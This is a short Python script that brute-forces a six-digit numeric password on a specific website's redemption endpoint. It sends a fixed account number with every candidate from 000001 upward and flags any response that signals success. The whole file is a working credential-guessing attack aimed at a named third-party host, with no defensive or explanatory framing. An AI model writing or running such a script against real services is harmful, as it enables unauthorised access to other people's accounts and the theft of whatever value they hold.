from urllib import request, parse
import json


def bruteForcePassword(password):
    try:
        url = r'http://wxwww.fh88.cn/index.php/Ajax/duihuan_chuli.html'
        data = {
            'bianhao': 'fh119283',
            'mima': password
        }
        data = parse.urlencode(data).encode('utf-8')
        req = request.Request(url, data=data)
        page = request.urlopen(req).read()
        page = page.decode('utf-8')
        response = json.loads(page)
        print(password, '=>', response)
        if response['status'] != '0':
            print(response, password)
    except:
        print(password, "=>", "Error")


if __name__ == '__main__':
    for i in range(1, 999999):
        password = "{:0>6d}".format(i)
        bruteForcePassword(password)
        if i % 1000 == 0:
            print("processing", i)
